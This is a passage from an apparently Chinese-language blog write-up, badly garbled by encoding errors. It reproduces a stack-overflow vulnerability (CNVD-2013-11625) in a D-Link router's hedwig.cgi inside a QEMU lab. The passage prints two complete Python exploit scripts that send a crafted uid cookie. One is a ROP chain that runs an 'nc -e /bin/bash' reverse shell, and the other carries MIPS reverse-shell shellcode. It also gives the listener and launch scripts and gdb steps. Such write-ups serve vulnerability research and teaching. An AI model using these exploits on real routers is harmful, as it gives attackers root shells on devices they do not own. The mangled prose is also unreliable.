åœ°å€ä¸ºå®¿ä¸»æœº 192.168.2.1ï¼Œç«¯å£å·ä¸º 8888</p><p>ä¸ºäº†æ¥æ”¶åå¼¹ shellï¼Œé¦–å…ˆ<strong>åœ¨å®¿ä¸»æœºå¼€å¯ä¸€ä¸ªç›‘å¬</strong>ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">8888</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B042.png" alt="CNVD-2013-11625å¤ç°42.png"></p><p>ä»ä¸Šé¢ä¸¤ä¸ª poc è„šæœ¬ä¹‹ä¸­é€‰æ‹©ä¸€ä¸ªï¼Œåœ¨å®¿ä¸»æœºä¸Šå†™å…¥ <code>poc.py</code>ï¼Œç„¶åæ‰§è¡Œ <code>poc.py</code> ç”Ÿæˆ payload</p><p>æˆ‘è¿™é‡Œä»¥ç¬¬ä¸€ä¸ª poc ä¸ºä¾‹ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B040.png" alt="CNVD-2013-11625å¤ç°40.png"></p><p>å°†è¿™ä¸ªæ–°ç”Ÿæˆçš„ payload æ–‡ä»¶ä¸Šä¼ åˆ° QEMU è™šæ‹Ÿæœºçš„è·¯ç”±å™¨æ–‡ä»¶ç³»ç»Ÿæ ¹ç›®å½•ä¸‹ï¼Œæ›¿æ¢æ‰å‰é¢ç”¨æ¥æµ‹è¯•æº¢å‡ºçš„ payload æ–‡ä»¶</p><p>ç„¶åä¿®æ”¹ä¸€ä¸‹ <code>run.sh</code> ä¸­çš„å¯åŠ¨å‘½ä»¤ï¼Œå› ä¸ºæˆ‘ä»¬ç°åœ¨ä¸éœ€è¦ gdbserver è°ƒè¯•äº†ï¼Œç›´æ¥å¯åŠ¨ <code>hedwig.cgi</code> å³å¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">CONTENT_LENGTH</span><span class="token operator">=</span><span class="token string">"11"</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">CONTENT_TYPE</span><span class="token operator">=</span><span class="token string">"application/x-www-form-urlencoded"</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">HTTP_COOKIE</span><span class="token operator">=</span><span class="token string">"uid=<span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> payload<span class="token variable">`</span></span>"</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">REQUEST_METHOD</span><span class="token operator">=</span><span class="token string">"POST"</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">REQUEST_URI</span><span class="token operator">=</span><span class="token string">"2333"</span>
<span class="token comment"># echo "winmt=pwner" | ./gdbserver 127.0.0.1:6666 /htdocs/web/hedwig.cgi</span>
<span class="token builtin class-name">echo</span> <span class="token string">"winmt=pwner"</span> <span class="token operator">|</span> /htdocs/web/hedwig.cgi
<span class="token builtin class-name">unset</span> CONTENT_LENGTH
<span class="token builtin class-name">unset</span> CONTENT_TYPE
<span class="token builtin class-name">unset</span> HTTP_COOKIE
<span class="token builtin class-name">unset</span> REQUEST_METHOD
<span class="token builtin class-name">unset</span> REQUEST_URI<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B041.png" alt="CNVD-2013-11625å¤ç°41.png"></p><p>åœ¨ QEMU è™šæ‹Ÿæœºä¸­è¿è¡Œ <code>run.sh</code>ï¼Œç„¶åå®¿ä¸»æœºä¸Šä¼šæ˜¾ç¤ºå·²è¿æ¥ï¼Œå¹¶ä¸”å¯ä»¥æ­£å¸¸ä½¿ç”¨ shell å‘½ä»¤æŸ¥çœ‹è·¯ç”±å™¨ç³»ç»Ÿä¸­çš„å†…å®¹ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B043.png" alt="CNVD-2013-11625å¤ç°43.png"></p><p>è€Œä¸”æˆ‘ä»¬æ˜¯ root æƒé™ç”¨æˆ·ï¼Œå¯ä»¥ä»»æ„å‘è·¯ç”±å™¨ç³»ç»Ÿå†™å…¥æ–‡ä»¶ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B044.png" alt="CNVD-2013-11625å¤ç°44.png"></p><p>åˆ°æ­¤ä¸ºæ­¢ï¼Œæ¼æ´å¤ç°æˆåŠŸï¼</p><hr><h4 id="æ³•äºŒï¼šå‘-httpd-æœåŠ¡å‘é€-HTTP-æŠ¥æ–‡"><a href="#æ³•äºŒï¼šå‘-httpd-æœåŠ¡å‘é€-HTTP-æŠ¥æ–‡" class="headerlink" title="æ³•äºŒï¼šå‘ httpd æœåŠ¡å‘é€ HTTP æŠ¥æ–‡"></a>æ³•äºŒï¼šå‘ httpd æœåŠ¡å‘é€ HTTP æŠ¥æ–‡</h4><blockquote><p><strong>è¿™ç§æ–¹å¼å°±éœ€è¦ç”¨åˆ°å‰é¢å¼€å¯çš„ HTTP æœåŠ¡äº†</strong>ï¼Œæˆ‘ä»¬ç›´æ¥ä»¥ HTTP æŠ¥æ–‡çš„å½¢å¼å‘é€ payload</p></blockquote><p>æˆ‘ä»¬å‰é¢åœ¨ <code>http_conf</code> ä¸­é…ç½®äº†å¦‚ä¸‹å†…å®¹æ¥å¯åŠ¨ <code>httpd</code> æœåŠ¡ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Server <span class="token punctuation">&#123;</span>
    ServerName <span class="token string">"Linux, HTTP/1.1, "</span>     <span class="token comment"># æœåŠ¡å™¨çš„åç§°å’Œåè®®</span>
    ServerId <span class="token string">"1234"</span>                    <span class="token comment"># æœåŠ¡å™¨çš„æ ‡è¯†ç¬¦</span>
    Family inet                        <span class="token comment"># ä½¿ç”¨çš„åè®®æ—ï¼Œè¿™é‡Œæ˜¯ IPv4</span>
    Interface eth0                     <span class="token comment"># ç»‘å®šçš„ç½‘ç»œæ¥å£ï¼Œè¿™é‡Œæ˜¯ç½‘å¡ eth0</span>
    Address <span class="token number">192.168</span>.2.2                <span class="token comment"># qemu çš„ ip åœ°å€</span>
    Port <span class="token string">"4321"</span>                        <span class="token comment"># å¯¹åº” web è®¿é—®ç«¯å£ï¼ŒæœåŠ¡å™¨ç›‘å¬ç«¯å£</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>äºæ˜¯ç›´æ¥å‘ 192.168.2.2:4321 å‘é€ HTTP æŠ¥æ–‡</p><p>poc å¦‚ä¸‹ï¼š</p><ol><li>çº¯ ROP é“¾ï¼Œå³æ„é€  <code>system(&quot;/bin/sh&quot;)</code> æ¥ getshell</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> requests

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'mips'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

cmd <span class="token operator">=</span> <span class="token string">b'nc -e /bin/bash 192.168.2.1 8888'</span>   <span class="token comment"># åå¼¹ shell</span>

libc_base <span class="token operator">=</span> <span class="token number">0x77f34000</span>

<span class="token comment"># åˆ›å»º payload</span>
payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x3cd</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x53200</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># s0  system_addr - 1</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x169C4</span><span class="token punctuation">)</span>      <span class="token comment"># s1  addiu $s2, $sp, 0x18 (=> jalr $s0)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">7</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x32A98</span><span class="token punctuation">)</span>      <span class="token comment"># ra  addiu $s0, 1 (=> jalr $s1)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span>
payload <span class="token operator">+=</span> cmd

<span class="token comment"># å®šä¹‰ç›®æ ‡ URL å’Œæ•°æ®</span>
url <span class="token operator">=</span> <span class="token string">"http://192.168.2.2:4321/hedwig.cgi"</span>
data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"winmt"</span><span class="token punctuation">:</span> <span class="token string">"pwner"</span><span class="token punctuation">&#125;</span>

<span class="token comment"># å®šä¹‰è¯·æ±‚å¤´</span>
headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string">b"uid="</span> <span class="token operator">+</span> payload<span class="token punctuation">,</span>
    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">,</span>
    <span class="token string">"Content-Length"</span><span class="token punctuation">:</span> <span class="token string">"11"</span>
<span class="token punctuation">&#125;</span>

<span class="token comment"># å‘é€ POST è¯·æ±‚</span>
res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>

<span class="token comment"># æ‰“å°å“åº”</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>é€šè¿‡ shellcode æ¥ getshellï¼ˆç”±äº MIPS æ¶æ„æ˜¯æ— æ³•å¼€å¯ NX ä¿æŠ¤çš„ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ <code>ret2shellcode</code>ï¼Œä½†éœ€è¦æ³¨æ„ <code>shellcode</code> ä¸­ä¸èƒ½å­˜åœ¨ <code>\x00</code> ç­‰å­—ç¬¦é˜²æ­¢å¯¼è‡´ <code>sprintf</code> è¢«æˆªæ–­ï¼‰</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> requests
context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'mips'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>
 
libc_base <span class="token operator">=</span> <span class="token number">0x77f34000</span>
 
payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x3cd</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x436D0</span><span class="token punctuation">)</span> <span class="token comment"># s1  move $t9, $s3 (=> lw... => jalr $t9)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x56BD0</span><span class="token punctuation">)</span> <span class="token comment"># s3  sleep</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x57E50</span><span class="token punctuation">)</span> <span class="token comment"># ra  li $a0, 1 (=> jalr $s1)</span>
 
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x37E6C</span><span class="token punctuation">)</span> <span class="token comment"># s4  move  $t9, $a1 (=> jalr $t9)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x3B974</span><span class="token punctuation">)</span> <span class="token comment"># ra  addiu $a1, $sp, 0x18 (=> jalr $s4)</span>
 
shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
    slti $a0, $zero, 0xFFFF
    li $v0, 4006
    syscall 0x42424
 
    slti $a0, $zero, 0x1111
    li $v0, 4006
    syscall 0x42424
 
    li $t4, 0xFFFFFFFD
    not $a0, $t4
    li $v0, 4006
    syscall 0x42424
 
    li $t4, 0xFFFFFFFD
    not $a0, $t4
    not $a1, $t4
    slti $a2, $zero, 0xFFFF
    li $v0, 4183
    syscall 0x42424
 
    andi $a0, $v0, 0xFFFF
    li $v0, 4041
    syscall 0x42424
    li $v0, 4041
    syscall 0x42424
 
    lui $a1, 0xB821 # Port: 8888
    ori $a1, 0xFF01
    addi $a1, $a1, 0x0101
    sw $a1, -8($sp)
 
    li $a1, 0x0102A8C0 # IP: 192.168.2.1
    sw $a1, -4($sp)
    addi $a1, $sp, -8
 
    li $t4, 0xFFFFFFEF
    not $a2, $t4
    li $v0, 4170
    syscall 0x42424
 
    lui $t0, 0x6962
    ori $t0, $t0,0x2f2f
    sw $t0, -20($sp)
 
    lui $t0, 0x6873
    ori $t0, 0x2f6e
    sw $t0, -16($sp)
 
    slti $a3, $zero, 0xFFFF
    sw $a3, -12($sp)
    sw $a3, -4($sp)
 
    addi $a0, $sp, -20
    addi $t0, $sp, -20
    sw $t0, -8($sp)
    addi $a1, $sp, -8
 
    addiu $sp, $sp, -20
 
    slti $a2, $zero, 0xFFFF
    li $v0, 4011
    syscall 0x42424
'''</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span>
payload <span class="token operator">+=</span> shellcode

<span class="token comment"># å®šä¹‰ç›®æ ‡ URL å’Œæ•°æ®</span>
url <span class="token operator">=</span> <span class="token string">"http://192.168.2.2:4321/hedwig.cgi"</span>
data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"winmt"</span> <span class="token punctuation">:</span> <span class="token string">"pwner"</span><span class="token punctuation">&#125;</span>

<span class="token comment"># å®šä¹‰è¯·æ±‚å¤´</span>
headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"Cookie"</span>        <span class="token punctuation">:</span> <span class="token string">b"uid="</span> <span class="token operator">+</span> payload<span class="token punctuation">,</span>
    <span class="token string">"Content-Type"</span>  <span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">,</span>
    <span class="token string">"Content-Length"</span><span class="token punctuation">:</span> <span class="token string">"11"</span>
<span class="token punctuation">&#125;</span>

<span class="token comment"># å‘é€ POST è¯·æ±‚</span>
res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">,</span> data <span class="token operator">=</span> data<span class="token punctuation">)</span>

<span class="token comment"># æ‰“å°å“åº”</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸¤ä¸ª poc éƒ½è®¾ç½®äº†åå¼¹ shellï¼Œåå¼¹çš„ IP åœ°å€ä¸ºå®¿ä¸»æœº 192.168.2.1ï¼Œç«¯å£å·ä¸º 8888</p><p>ä¸ºäº†æ¥æ”¶åå¼¹ shellï¼Œé¦–å…ˆ<strong>åœ¨å®¿ä¸»æœºå¼€å¯ä¸€ä¸ªç›‘å¬</strong>ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">8888</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B042.png" alt="CNVD-2013-11625å¤ç°42.png"></p><p>ä»ä¸Šé¢ä¸¤ä¸ª poc è„šæœ¬ä¹‹ä¸­é€‰æ‹©ä¸€ä¸ªï¼Œæˆ‘è¿™é‡Œä»¥ç¬¬ä¸€ä¸ª poc ä¸ºä¾‹ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B045.png" alt="CNVD-2013-11625å¤ç°45.png"></p><p>å¯ä»¥çœ‹åˆ°åå¼¹ shell åˆå§‹ç›®å½•ä½äº <code>/htdocs/web</code>ï¼Œæˆ‘ä»¬ä»ç„¶æ˜¯ root æƒé™ç”¨æˆ·</p><p>åˆ°æ­¤ä¸ºæ­¢ï¼Œæ¼æ´å¤ç°æˆåŠŸï¼</p><hr><h3 id="QEMU-ç”¨æˆ·çº§å¤ç°"><a href="#QEMU-ç”¨æˆ·çº§å¤ç°" class="headerlink" title="QEMU ç”¨æˆ·çº§å¤ç°"></a>QEMU ç”¨æˆ·çº§å¤ç°</h3><blockquote><p><strong>QEMU ç”¨æˆ·çº§å±‚é¢çš„æ¼æ´å¤ç°ä¸éœ€è¦è¿›è¡Œä»¿çœŸ</strong>ï¼Œä½†ç›¸æ¯”ä¹‹ä¸‹ï¼Œéœ€è¦è¿›è¡Œä»¿çœŸçš„ç³»ç»Ÿçº§å¤ç°æ›´åŠ ç›´è§‚ã€æ›´ç¬¦åˆç°å®åœºæ™¯ï¼Œè¿™é‡Œä¸»è¦æ˜¯ä»‹ç» QEMU ç”¨æˆ·çº§å±‚é¢çš„æ¼æ´å¤ç°æ–¹å¼</p></blockquote><h4 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h4><p>é¦–å…ˆæ‰“å¼€<strong>å®¿ä¸»æœº</strong>çš„è·¯ç”±å™¨æ–‡ä»¶ç³»ç»Ÿæ ¹ç›®å½•</p><p>ç”Ÿæˆ 2000 ä¸ªå­—ç¬¦çš„ payload æ–‡ä»¶ï¼Œç”¨æ¥æµ‹è¯• <code>uid</code> æº¢å‡ºåˆ°æ ˆä¸Šè¿”å›åœ°å€æ‰€éœ€çš„å­—èŠ‚æ•°ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cyclic <span class="token number">2000</span> <span class="token operator">></span> payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ›å»ºä»¥ä¸‹ <code>run.sh</code> è„šæœ¬ï¼Œé€šè¿‡ QEMU ç”¨æˆ·æ¨¡å¼å¯åŠ¨ <code>/htdocs/cgibin</code> ç¨‹åºï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
 
<span class="token assign-left variable">INPUT</span><span class="token operator">=</span><span class="token string">"winmt=pwner"</span>
<span class="token assign-left variable">LEN</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> <span class="token string">"<span class="token variable">$INPUT</span>"</span> <span class="token operator">|</span> <span class="token function">wc</span> <span class="token parameter variable">-c</span><span class="token variable">)</span></span>
<span class="token assign-left variable">cookie</span><span class="token operator">=</span><span class="token string">"uid=<span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> payload<span class="token variable">`</span></span>"</span>

<span class="token builtin class-name">echo</span> <span class="token variable">$INPUT</span> <span class="token operator">|</span> qemu-mipsel-static <span class="token parameter variable">-L</span> ./ <span class="token parameter variable">-0</span> <span class="token string">"hedwig.cgi"</span> <span class="token parameter variable">-E</span> <span class="token assign-left variable">REQUEST_METHOD</span><span class="token operator">=</span><span class="token string">"POST"</span> <span class="token parameter variable">-E</span> <span class="token assign-left variable">CONTENT_LENGTH</span><span class="token operator">=</span><span class="token variable">$LEN</span> <span class="token parameter variable">-E</span> <span class="token assign-left variable">CONTENT_TYPE</span><span class="token operator">=</span><span class="token string">"application/x-www-form-urlencoded"</span> <span class="token parameter variable">-E</span> <span class="token assign-left variable">HTTP_COOKIE</span><span class="token operator">=</span><span class="token variable">$cookie</span> <span class="token parameter variable">-E</span> <span class="token assign-left variable">REQUEST_URI</span><span class="token operator">=</span><span class="token string">"2333"</span> <span class="token parameter variable">-g</span> <span class="token number">1234</span> ./htdocs/cgibin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œé€šè¿‡ <code>-g 1234</code> åœ¨ 1234 ç«¯å£å¼€å¯äº† gdbserver ç›‘å¬ï¼Œ<code>cat payload</code> å¯ä»¥å°† <code>payload</code> æ–‡ä»¶ä¸­çš„å†…å®¹è¯»åˆ° <code>uid=</code> ä¹‹åï¼Œ<code>echo $INPUT |</code> å¯ä»¥åšåˆ° POST çš„æ•ˆæœï¼Œ<code>-0</code> å°±æ˜¯ <code>argv[0]</code>ï¼Œ<code>-E</code> æ˜¯è®¾ç½®ç¯å¢ƒå˜é‡</p><p>ç„¶åæ‰§è¡Œ <code>run.sh</code>ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B046.png" alt="CNVD-2013-11625å¤ç°46.png"></p><p>å¯ä»¥çœ‹åˆ°æœ¬æœºå¼€å¯äº† 1234 ç«¯å£ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B047.png" alt="CNVD-2013-11625å¤ç°47.png"></p><p>ç„¶åä½¿ç”¨æœ¬æœºçš„ <code>gdb-multiarch</code> è¿æ¥ gdbserverï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb-multiarch
<span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> architecture mips
<span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> target remote <span class="token number">127.0</span>.0.1:1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B048.png" alt="CNVD-2013-11625å¤ç°48.png"></p><p>ä½†æ˜¯å‘ç° <strong>QEMU ç”¨æˆ·æ¨¡å¼è¿ä¸Š pwndbg æ—¶ï¼Œ<code>vmmap</code> æ— æ³•çœ‹åˆ° libc çš„åŸºåœ°å€</strong>ï¼šï¼ˆlibc ç›´æ¥ä¸æ˜¾ç¤ºï¼Œè€Œæ˜¯æ˜¾ç¤º <code>&lt;explored&gt;</code>ï¼‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> b main
<span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> c

<span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> vmmap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B049.png" alt="CNVD-2013-11625å¤ç°49.png"></p><p><em>å› æ­¤åˆ©ç”¨ Linux çš„å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œå½“ä¸€ä¸ªå‡½æ•°åœ¨ç¬¬äºŒæ¬¡åŠä»¥åè¢«è°ƒç”¨çš„æ—¶å€™ï¼Œå°±ä¼šç›´æ¥è·³è½¬åˆ°å…¶ç›¸åº”çš„ <code>libc</code> åœ°å€ï¼ˆçœŸå®åœ°å€ï¼‰</em></p><blockquote><p>å¦‚æœå¯¹å»¶è¿Ÿç»‘å®šè¿™ä¸€å—ä¸å¤ªäº†è§£ï¼Œè¯¦è§æœ¬ç«™çš„ã€Š<a href="29133b28.html">PLTè¡¨å’ŒGOTè¡¨</a>ã€‹ä¸€æ–‡</p></blockquote><p>æˆ‘ä»¬åœ¨ IDA ä¸‹æ‰¾ä¸¤æ¬¡è·³è½¬åˆ°åŒä¸€ä¸ª libc å‡½æ•°çš„åœ°æ–¹ï¼Œä¾‹å¦‚ <code>hedwigcgi_main()</code> å‡½æ•°ä¸­ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B050.png" alt="CNVD-2013-11625å¤ç°50.png"></p><p>ç„¶åæŠŠ GDB æ–­ç‚¹è®¾ç½®åœ¨è¿™é‡Œï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> b *0x4094C8
<span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B051.png" alt="CNVD-2013-11625å¤ç°51.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> b *0x4094E4
